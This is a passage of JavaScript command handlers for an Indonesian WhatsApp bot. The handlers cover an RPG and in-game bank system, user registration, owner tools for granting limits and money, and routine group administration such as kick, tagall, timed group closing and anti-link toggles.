if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
let teksehmazeh = `*INFO USER*
 *📝 Name* : ${pushname}
 *📱 Number* : ${nomore}
 *👩‍⚕️ Premium* : ${isPremium ? 'Premium':'Free'}
 *🕺🏻 Petualang* : ${isPetualang ? 'Petualang':'Bukan Petualang'}
 *RPG USER*
 *❤️ Blood* : ${getDarah(m.sender) ? getDarah(m.sender) : 0}
 *◻️️ Iron* : ${getBesi(m.sender) ? getBesi(m.sender) : 0}
 *🌟 Gold* : ${getEmas(m.sender) ? getEmas(m.sender) : 0}
 *🐲 Emerald* : ${getEmerald(m.sender) ? getEmerald(m.sender) : 0}
 *💎 Diamond* : ${getDm(m.sender) ? getDm(m.sender) : 0}
 *⏺️ Limit* : ${isCreator ? 'Unlimited' : isPremium ? 'Unlimited' : getLimit(m.sender, limitCount, limit)}
 *💵 Saldo* : *Rp:${toRupiah(cekSaldo(sender, db_saldo))}*
 *🧪 Potion* : ${getPotion(m.sender) ? getPotion(m.sender) : 0}
 *HUNT RESULT*
 *🐟 Fish* : ${getIkan(m.sender)}
 *🐔 Chicken* : ${getAyam(m.sender) ? getAyam(m.sender) : 0}
 *🐇 Rabbit* : ${getKelinci(m.sender) ? getKelinci(m.sender) : 0}
 *🐑 Sheep* : ${getDomba(m.sender) ? getDomba(m.sender) : 0}
 *🐄 Cow* : ${getSapi(m.sender) ? getSapi(m.sender) : 0}
 *🐘 Elephant* : ${getGajah(m.sender) ? getGajah(m.sender) : 0}
 🎢 *Coal* : ${getMiningcoal(m.sender) ? getMiningcoal(m.sender) : 0}
 🛑 *Stone* : ${getMiningstone(m.sender) ? getMiningstone(m.sender) : 0}
 ❄️ *Copper Ore* : ${getMiningore(m.sender) ? getMiningore(m.sender) : 0}
 🛠️ *Ingot Ore* : ${getMiningingot(m.sender) ? getMiningingot(m.sender) : 0}
 🪵 *Wood* : ${getNebangKayu(m.sender) ? getNebangKayu(m.sender) : 0}`
await alifatah.sendMessage(m.chat, {
text: teksehmazeh,
contextInfo: {
externalAdReply: {
title: `${pushname} PROFILE & BAG`, 
body: 'Play RPG Games With Your Friends',
thumbnailUrl: ppuser,
sourceUrl: ``,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted:fcall})
}
break

 case 'tarikuang': {
let user = global.db.data.users[m.sender]
let count = command.replace(/^tarik/i, '')
count = count ? /all/i.test(count) ? Math.floor(global.db.data.users[m.sender].bank / xpperlimit) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
count = Math.max(1, count)
if (user.atm == 0) return reply('kamu belum mempuyai atm !')
if (global.db.data.users[m.sender].bank >= xpperlimit * count) {
global.db.data.users[m.sender].bank -= xpperlimit * count
global.db.data.users[m.sender].money += count
reply(`Sukses menarik sebesar ${count} Money 💹`)
} else reply(`[❗] Uang dibank anda tidak mencukupi untuk ditarik sebesar ${count} money 💹`)
}
break
case 'nabung': {
let user = global.db.data.users[m.sender]
if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) 
db.data.users[m.sender].limit -= 1
let count = command.replace(/^nabung/i, '')
count = count ? /all/i.test(count) ? Math.floor(global.db.data.users[m.sender].money / xpperlimit) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
count = Math.max(1, count)
if (user.atm == 0) return reply('kamu belum mempuyai atm !')
if (user.bank > user.fullatm) return reply('Uang dibankmu sudah penuh!')
if (count > user.fullatm - user.bank) return reply('Uangnya ga muat dibank')
if (global.db.data.users[m.sender].money >= xpperlimit * count) {
global.db.data.users[m.sender].money -= xpperlimit * count
global.db.data.users[m.sender].bank += count
reply(`Sukses menabung sebesar ${count} Money 💹`)
} else reply(`[❗] Uang anda tidak mencukupi untuk menabung ${count} money 💹`)
}
break
case 'merampok': {
let user = global.db.data.users[m.sender]
const timeout = 1800000
let time = global.db.data.users[m.sender].lastmulung + 1800000
if (new Date - global.db.data.users[m.sender].lastmulung< 1800000) return reply(`*Kamu sudah merampok!*\n\nTunggu selama ${msToTime(time - new Date())} lagi`)
let botolnye = `${Math.floor(Math.random() * 30000)}`.trim()
let kalengnye = `${Math.floor(Math.random() * 999)}`.trim()
let kardusnye = `${Math.floor(Math.random() * 1000)}`.trim()
global.db.data.users[m.sender].money += botolnye * 1
global.db.data.users[m.sender].exp += kalengnye * 1
global.db.data.users[m.sender].kardus += kardusnye * 1
global.db.data.users[m.sender].lastmulung = new Date * 1
reply(`*Selamat kamu mendapatkan :*\n\n• Exp : ${kalengnye}\n• Kardus : ${kardusnye}\n• Uang : ${botolnye}`)
setTimeout(() => {
reply(`*Gas Rampok lagi ga si 😆*`)
}, timeout)
}
break
case 'bank': {
let user = global.db.data.users[m.sender]
const caption = `
▧「 *B A N K  U S E R* 」
│ 📛 *Name:* ${user.registered ? user.name : alifatah.getName(m.sender)}
│ 💳 *Atm:* ${user.atm > 0 ? 'Level ' + user.atm : '✖️'}
│ 🏛️ *Bank:* ${user.bank} 💲 / ${user.fullatm} 💲
│ 💹 *Money:* ${user.money} 💲
│ 🤖 *Robo:* ${user.robo > 0 ? 'Level ' + user.robo : '✖️'}
│ 🌟 *Status:* ${user.premium ? "Premium" : "Free User"}
└──···
`.trim()
alifatah.sendMessage(m.chat, {
text: caption,
contextInfo: {
externalAdReply: {
title: namabot,
thumbnailUrl: "https://telegra.ph/file/00ee61b555099bbfdd614.jpg",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted:fcall}) 
}
break
case 'ceklimit':{
let user = global.db.data.users[m.sender]
let ARC = `×  *Username* : ${pushname}
×  *Limit* : ${user.limit}
`
await alifatah.sendMessage(m.chat, {
text: ARC,
contextInfo: {
externalAdReply: {  
title: namabot,
body: hariini,
thumbnailUrl: 'https://telegra.ph/file/977f57c103336bd2072aa.jpg',
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted:fcall})
}
break      
case 'cekmoney':{
let user = global.db.data.users[m.sender]
let Icikiwir = `×  *Username* : ${pushname}
×  *Money* : ${user.money}
`
reply(Icikiwir)
}
break      
case 'claim-money': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
let user = global.db.data.users[m.sender]
if (new Date - global.db.data.users[m.sender].lastclaim > 86400000) {
reply(`Selamat kamu mendapatkan :\n\n• Uang : 50000`)
global.db.data.users[m.sender].money += 50000
global.db.data.users[m.sender].lastclaim = new Date * 1
} else reply(`Anda Sudah Mengklaim ya`)
}
break
case 'addlimit':{ 
   if (args.length === 2 && args[0] === 'all') {
    let users = global.db.data.users;
    let pointsToAdd = parseInt(args[1]);
    if (isNaN(pointsToAdd)) {
      return alifatah.reply(m.chat, '🚩 Jumlah limit yang dimasukkan harus berupa angka. Contoh: .addlimit all 100', m)
    }
    for (let user in users) {
      users[user].limit += pointsToAdd;
    }
    alifatah.reply(m.chat, `🚩 Berhasil menambahkan ${pointsToAdd} limit untuk semua pengguna.`, m);
  } else if (args.length === 2) {
    let mentionedJid = m.mentionedJid[0];
    if (!mentionedJid) {
      return alifatah.reply(m.chat,  '🚩 Tag pengguna yang ingin diberikan limit. Contoh: .addlimir @user 100', m)
    }
      
	alifatah.sendMessage(m.chat, {
		react: {
			text: '🕒',
			key: m.key,
		}
	})

    let pointsToAdd = parseInt(args[1]);
    if (isNaN(pointsToAdd)) {
      return alifatah.reply(m.chat, '🚩 Jumlah limit yang dimasukkan harus berupa angka. Contoh: .addlimit @user 100', m)
    }

    let users = global.db.data.users;
    if (!users[mentionedJid]) {
      users[mentionedJid] = {
        limit: 0,
        exp: 0,
        lastclaim: 0,
      };
    }

    users[mentionedJid].limit += pointsToAdd;

    alifatah.reply(m.chat, `🚩 Berhasil menambahkan ${pointsToAdd} limit untuk @${mentionedJid.split('@')[0]}.`, m, {
      mentions: [mentionedJid]
    });
  } else {
    return alifatah.reply(m.chat,  '• *Example :* .addlimit @user 100 atau .addlimit all 100', m)
  }
};
break;
case 'addmoney':{
if (!isCreator) return reply(mess.owner)
   if (args.length === 2 && args[0] === 'all') {
    let users = global.db.data.users;
    let pointsToAdd = parseInt(args[1]);
    if (isNaN(pointsToAdd)) {
      return alifatah.reply(m.chat, '💰 Jumlah Money yang dimasukkan harus berupa angka. Contoh: .addmoney all 100', m)
    }
    for (let user in users) {
      users[user].money += pointsToAdd;
    }
    alifatah.reply(m.chat, `💰 Berhasil menambahkan ${pointsToAdd} Money untuk semua pengguna.`, m);
  } else if (args.length === 2) {
    let mentionedJid = m.mentionedJid[0];
    if (!mentionedJid) {
      return alifatah.reply(m.chat,  '💰 Tag pengguna yang ingin diberikan Money. Contoh: .addmoney @user 100', m)
    }
      
	alifatah.sendMessage(m.chat, {
		react: {
			text: '🕒',
			key: m.key,
		}
	})

    let pointsToAdd = parseInt(args[1]);
    if (isNaN(pointsToAdd)) {
      return alifatah.reply(m.chat, '💰 Jumlah Money yang dimasukkan harus berupa angka. Contoh: .addmoney @user 100', m)
    }

    let users = global.db.data.users;
    if (!users[mentionedJid]) {
      users[mentionedJid] = {
        money: 0,
        exp: 0,
        lastclaim: 0,
      };
    }

    users[mentionedJid].money += pointsToAdd;

    alifatah.reply(m.chat, `💰 Berhasil menambahkan ${pointsToAdd} Money untuk @${mentionedJid.split('@')[0]}.`, m, {
      mentions: [mentionedJid]
    });
  } else {
    return alifatah.reply(m.chat,  '• *Example :* .addmoney @user 100 atau .addmoney all 100', m)
  }
};
break;

case 'statusaudio':
case 'upswaudio': {
if (!isCreator) return reply(mess.owner)
if (/audio/.test(mime)) {
var audiosw = await alifatah.downloadAndSaveMediaMessage(quoted)
await alifatah.sendMessage('status@broadcast', {
audio: {
url: audiosw
},
mimetype: 'audio/mp4',
ptt: true
}, {
backgroundColor: '#D2B48C',
statusJidList: Object.keys(global.db.data.users)
})
await reply(mess.done)
} else {
reply('Reply to audio')
}
}
break

case 'resetlimit': {
if (!isCreator) return reply(mess.owner)
let listt = Object.entries(global.db.data.users)
	let lim = !args || !args[0] ? 30 : isNumber(args[0]) ? parseInt(args[0]) : 30
	lim = Math.max(1, lim)
	listt.map(([user, data], i) => (Number(data.limit = lim)))
alifatah.reply(m.chat, `*Limit berhasil direset ${lim} / user*`, m)
}
            break
        /*case 'daftar':{
                if (isRegistered) return reply('Kamu sudah terdaftar')
                if (!q.includes('')) return reply('Format salah!')
                const umurUser = q.substring(q.lastIndexOf(' ') + 1)
                const namaUser = q.substring(0, q.indexOf(' ') - 0)
              //if(isNaN(umurUser)) return reply('Umur harus berupa angka!!')
				alifatah.sendList(m.chat, "*[ Verifikasi Umur ]*\nSebelum Menggunakan Fitur Bot ALIFATAH - MD, Kamu Harus Daftar Terlebih Dahulu Kak, Dengan Cara Menekan Tombol Di Bawah Lalu Pilih Umur Kamu\n", `Hii ${pushname} ${ucapanWaktu}`, {
                    title: 'Daftar Pengguna', sections: [{
                        title: "Pilih Umur",
                        rows: [
                            {
                                title: "Pilih usia yang sesuai",
                                description: "Register Umur 12 Tahun",
                                id: `.daftar2 12 ${namaUser}`
                            },
                            {
                                title: "Pilih usia yang sesuai",
                                description: "Register Umur 13 Tahun",
                                id: `.daftar2 13 ${namaUser}`
                            },
                            {
                                title: "Pilih usia yang sesuai",
                                description: "Register Umur 14 Tahun",
                                id: `.daftar2 14 ${namaUser}`
                            },
                            {
                                title: "Pilih usia yang sesuai",
                                description: "Register Umur 15 Tahun",
                                id: `.daftar2 15 ${namaUser}`
                            },
                            {
                                title: "Pilih usia yang sesuai",
                                description: "Register Umur 16 Tahun",
                                id: `.daftar2 16 ${namaUser}`
                            },
                            {
                                title: "Pilih usia yang sesuai",
                                description: "Register Umur 17 Tahun",
                                id: `.daftar2 17 ${namaUser}`
                            },
                            {
                                title: "Pilih usia yang sesuai",
                                description: "Register Umur 18 Tahun",
                                id: `.daftar2 18 ${namaUser}`
                            },
                            {
                                title: "Pilih usia yang sesuai",
                                description: "Register Umur 19 Tahun",
                                id: `.daftar2 19 ${namaUser}`
                            },
                            {
                                title: "Pilih usia yang sesuai",
                                description: "Register Umur 20 Tahun",
                                id: `.daftar2 20 ${namaUser}`
                            }]
                            }]
                            },{quoted:m})}
		break*/        

case 'daftar':{
if (!text) return
                const namaUser = q.substring(0, q.indexOf(' ') - 0)
                const umurUser = q.substring(q.lastIndexOf(' ') + 1)
                const serialUser = createSerial(20)
                if(isNaN(umurUser)) return reply('Umur harus berupa angka!!')
                if (namaUser.length >= 30) return reply(`why is your name so long it's a name or a train`)
                if (umurUser > 40) return reply(`your age is too  old maximum 40 years`)
                if (umurUser < 12) return reply(`your age is too young minimum 12 years`)
                let mzd = `Hallo kak kamu telah terdaftar dalam database bot Whatsapp silahkan untuk mengetik *.menu* untuk melihat berbagai macam fitur yang kamu sediakan untuk anda\n\n_*⭔ Nama :*_ _${pushname}_\n_*⭔ Umur :*_ _${umurUser}_\n_*⭔ Nomor :*_ _wa.me/${sender.split("@")[0]}_`
                veri = m.sender
                if (!m.isGroup) {
                    addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
                    alifatah.sendMessage(m.chat, {
                    text: mzd,
                    contextInfo: { mentionedJid: [m.sender],
                    externalAdReply: {
                    showAdAttribution: true,
                    title: `S U K S E S - D A F T A R`,
                    body: 'Subscribe My YouTube',
                    thumbnailUrl: 'https://telegra.ph/file/fff81412789897d3ea5e0.jpg',
                    sourceUrl: "https://www.youtube.com/@Fauzialifatah",
                    mediaType: 1,
                    renderLargerThumbnail: true
                    }}}, {quoted:fcall})
                    
                } else {
                    addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
                    alifatah.sendMessage(m.chat, {
                    text: mzd,
                    contextInfo: { mentionedJid: [m.sender],
                    externalAdReply: {
                    showAdAttribution: true,
                    title: `S U K S E S - D A F T A R`,
                    body: 'Subscribe My YouTube',
                    thumbnailUrl: 'https://telegra.ph/file/fff81412789897d3ea5e0.jpg',
                    sourceUrl: "https://www.youtube.com/@Fauzialifatah",
                    mediaType: 1,
                    renderLargerThumbnail: true
                    }}}, {quoted:fcall})
                    
                }
}
break

/*case'daftar3':{
    if (!m.text) return;
        let v2 = { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: "REGISTER (2/3)"} }
        let name = alifatah.sendInputMessage(m.chat, { text: "Masukan Nama Anda:" }, m.sender, 120000000, v2) 
        let v3 = { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: "REGISTER (3/3)"} }
        let age;while(isNaN(age)) age = parseInt(alifatah.sendInputMessage(m.chat, { text: "Masukan Umur Anda:" }, m.sender, 120000000, v3))
        user.name = name.trim();
        user.age = age;
        user.regTime = +new Date;
        user.registered = true;
        let kemii = '0@s.whatsapp.net'
        let v4 = { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: "REGISTER SUCCESS"} }
        let today = new Date();
        let tanggal = today.toLocaleDateString("id-ID", { 
           day: 'numeric', 
           month: 'long', 
           year: 'numeric' 
          })
        let ppUrl = alifatah.profilePictureUrl(m.sender, 'image').catch((_) => "https://telegra.ph/file/1dff1788814dd281170f8.jpg");
        let tteks = 'Success Verifed\n\n'
        tteks += '```Name:```' + ` ${name}\n`
        tteks += '```Age:```' + ` ${age}\n`
        tteks += '```Number:```' + ` ${PhoneNumber('+' + m.sender.split('@')[0]).getNumber('international')}\n`
        tteks += '```Date:```' + ` ${tanggal}\n\n`
        tteks += `> Powered By _@${kemii.replace(/@.+/g, '')}_`
        alifatah.sendMessage(m.chat, {
        text: tteks,
        contextInfo: {
        mentionedJid: [kemii],
        externalAdReply: {
        showAdAttribution: true,
        title: 'ᴜꜱꜱᴀɴᴏᴢɪ ʟᴏʀᴢᴀʙʏ',
        body: 'Version: 5.0.1',
        thumbnailUrl: ppUrl,
        mediaType: 1,
        renderLargerThumbnail: true
        }}}, {quoted: v4})
        }{
        m.reply(`🚩 Your verification code is wrong.`)
        alifatah.sendMessage(m.chat, { delete: key });
        delete alifatah.registrasi[m.chat]?.[m.sender];
    }
break*/

case 'mysn': case 'ceksn': case 'sn': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
let user = global.db.data.users[m.sender]
	if (user.registered === false) return reply(mess.notregist);
const createHash = require("crypto");
let sn = crypto.createHash('md5').update(m.sender).digest('hex');
reply(`${sn}`)
}
break

case 'unreg': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
let user = global.db.data.users[m.sender]
  	if (user.registered === false) return reply(mess.notregist);
  if (!args[0]) return reply('*example*: .unreg 90259a21exxxxxx')
  let sn = crypto.createHash('md5').update(m.sender).digest('hex')
  if (args[0] !== sn) return reply('Serial number yang kamu masukkan salah!')

  user.registered = false
  reply(`Berhasil menghapus datamu, sekarang kamu tidak terdaftar lagi.`)
}
break
  
case "addmember":{
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!text && !m.quoted) reply('masukkan nomor yang ingin di tambahkan')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await alifatah.groupParticipantsUpdate(m.chat, [users], 'add').catch(console.log)
}
break


case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
    await alifatah.removeProfilePicture(from)
await reply("Sukses")
    }
    break

case 'cekidgc': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
if (!isBotAdmins) return reply(`Saya Bukan Admin Kak`)
let response = await alifatah.groupInviteCode(m.chat)
alifatah.sendText(m.chat, `${groupMetadata.id}`, m,  {
detectLink: true
})
}
break

case 'nfinp': {
if (!isCreator) return reply(`No Access Denied`)
if (!m.isGroup) return reply(mess.group)
if (!text) return reply(`Silahkan Masukan ID Group Kamu Dengan Cara *.nfinp <id>*`)
let user = db.data.users[m.sender]
let inp = text
user.gid = inp + '@g.us'
reply(`Sukses Setting ID Group! Ke ${inp}`)
}
break


case 'noftication': case 'nf': {
if (!isCreator) return reply(`No Access Denied`)
if (!m.isGroup) return reply(mess.group)
if (!text) return reply(`masukan Query`)
let user = db.data.users[m.sender]
if (!user.gid) return reply(`Silahkan Masukan ID Group Untuk Noftikasi Bot, Dengan Mengetik *.nfinp*`)
let caption = `*[ 🔔 ] Nofitication*

${text}`
alifatah.sendMessage(`${user.gid}`, { text: caption }, { quoted:fcall})
reply(`Berhasil Mengirim Nofitication / Pemberitahuan`)
}
break

case 'hidetag': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
alifatah.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted:fcall })
}
break

case "kick":{
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!text && !m.quoted) reply('masukkan nomor yang ingin di kick')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await alifatah.groupParticipantsUpdate(m.chat, [users], 'remove').catch(console.log)
}
break

case 'sendlinkgc': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await alifatah.groupInviteCode(from)
alifatah.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'tagall': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
let teks = `══✪〘 *👥 Tag alifatahl* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
alifatah.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break

case 'hapus': case 'delete': {
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!m.quoted) return reply('Reply pesan yang ingin dihapus!')
if (!isBotAdmins) return reply('Gua bukan admin Tod')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await alifatah.sendMessage(m.chat, { delete: { remoteJid: m.chat, id: m.quoted.id, participant: m.quoted.sender } })
}
break

case 'closetime':
if (!m.isGroup) return reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return reply(mess.badm)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
reply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
alifatah.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break
  
case 'opentime':
if (!m.isGroup) return reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return reply(mess.badm)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
reply(`Open time ${q} dimulai dari sekarang`)
setTimeout( () => {
const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
alifatah.groupSettingUpdate(from, 'not_announcement')
reply(open)
}, timer)
break

case 'pppanjanggc': case 'setppgcful': case 'setppgc2':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!isBotAdmins) return reply(mess.BotAdmin)
if (!quoted) return reply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Reply foto dgn caption ${prefix + command}`)
let media = await alifatah.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await alifatah.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
reply("Sukses!")
}
break

case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!isBotAdmins) return reply(mess.BotAdmin)
if (!quoted) return reply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await alifatah.downloadAndSaveMediaMessage(quoted)
await alifatah.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
reply("Sukses!")
}
break

case 'setnamegc':
if (!m.isGroup) return reply('Fitur Khusus Group!')
	if (!isAdmins && !isCreator) return reply('Fitur Khusus Admin grup!')
	if (!isBotAdmins) return reply('Saya bukan Admin grup!')
	if (args.length < 1) return reply(`Kirim perintah ${command} teks`)
	await alifatah.groupUpdateSubject(m.chat, q)
	.then( res => {
	reply(`Sukses mengganti subjek grup!`)
	}).catch(() => reply('Error kak'))
	break

case 'setdesc': {
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus Admin grup!')
if (!isBotAdmins) return reply('Saya bukan Admin grup!')
if (!q) return reply(`*Kirim perintah :* ${command} teks`)
await alifatah.groupUpdateDescription(m.chat, q)
.then( res => {
reply(`Sukses mengganti deskripsi ${groupName}\n\n*DESKRIPSI SEBELUMNYA*\n${groupMetadata.desc}\n\nKlik profil grup ini untuk melihat deskripsi dengan jelas.`)
}).catch(() => reply('Error kak'))
}
break

case 'cekmem': 
case 'cekmember': {
if (!m.isGroup) return reply('Fitur Khusus Group!')
let kntl = `CEK MEMBER *${groupName}*\n• ${groupMetadata.participants.length} Member grup!`
reply(kntl)
}
break

case 'getid': 
case 'getidgrup': 
case 'getidgc': {
if (!m.isGroup) return reply('Fitur Khusus Group!')
let tod = `*GET ID GRUB*\n${groupMetadata.id}\n\n*GRUB NAME :* ${groupName}`
reply(tod)
}
break

case 'getdesc': 
case 'getdesk': {
if (!m.isGroup) return reply('Fitur Khusus Group!')
let iya = `DESKRIPSI GRUB *${groupName}*\n\n${groupMetadata.desc}`
reply(iya)
}
break

case 'tagadmin': 
case 'listadmin': 
case 'admin':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*TAG ADMIN GRUB :*
${listAdmin}
`.trim()
alifatah.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted:fcall})
}
break

case 'antilall': {
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus Admin!')
if (!isBotAdmins) return reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiLalifatahl) return reply(`_Kan udah aktif sebelumnya_`)
antilinkall.push(m.chat)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(antilinkall, null, 2))
reply('Sukses Mengaktifkan Antilinkall')
} else if (args[0] === "off") {
if (!isAntiLalifatahl) return reply(`_Kan udah nonaktif sebelumnya_`)
let anu = antilinkall.indexOf(m.chat)
antilinkall.splice(anu, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(antilinkall, null, 2))
reply('Sukses Menonaktifkan Antilinkall')
} else {
reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break

case 'antiwame': {
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus Admin!')
if (!isBotAdmins) return reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiWame) return reply(`_Kan udah aktif sebelumnya_`)
antiwame.push(m.chat)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
reply('Sukses Mengaktifkan Antiwame')
} else if (args[0] === "off") {
if (!isAntiWame) return reply(`_Kan udah nonaktif sebelumnya_`)
let anu = antiwame.indexOf(m.chat)
antiwame.splice(anu, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
reply('Sukses Menonaktifkan Antilinkwame')
} else {
reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
  }
}
break

case 'antilinkytvid': {
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus Admin!')
if (!isBotAdmins) return reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiLinkYoutubeVid) return reply(`_Kan udah aktif sebelumnya_`)
antilinkytvid.push(m.chat)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(antilinkytvid, null, 2))
reply('Sukses Mengaktifkan Antilinkytvid')
} else if (args[0] === "off") {
if (!isAntiLinkYoutubeVid) return reply(`_Kan udah nonaktif sebelumnya_`)
let anu = antilinkytvid.indexOf(m.chat)
antilinkytvid.splice(anu, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(antilinkytvid, null, 2))
reply('Sukses Menonaktifkan Antilinkytvid')
} else {
reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
  }
}
break

    case 'antifoto':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isBotAdmins) return reply('Saya bukan Admin grup!')
if (!isAdmins && !isCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
if (isAntiFoto) return reply(`Udah aktif`)
antifoto.push(m.chat)
fs.writeFileSync('./database/antifoto.json', JSON.stringify(antifoto, null, 2))
reply('Sukses Mengaktifkan Anti Foto')
} else if (args[0] === "off") {
if (!isAntiFoto) return reply(`Udah Mati`)
let anu = antifoto.indexOf(m.chat)
antifoto.splice(anu, 1)
fs.writeFileSync('./database/antifoto.json', JSON.stringify(antifoto, null, 2))
reply('Sukses Mematikan Anti Foto')
} else {
reply(`${prefix+command} *on*\n${prefix+command} *off*`)
}}
break

//=======================================================//

case 'totalfitur':
case 'totalfeature':{
if (!isRegistered) return reply('Kamu belum daftar! Silahkan daftar dengan cara .daftar fauzialifatah!')
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
let fitur = `
*TOTAL FEATURE*

• BerJumlah ${totalFitur()} Fitur\n*Tipe :* Case

Silahkan ketik *.menu* untuk
Menampilkan menu utama`
reply(fitur)
}
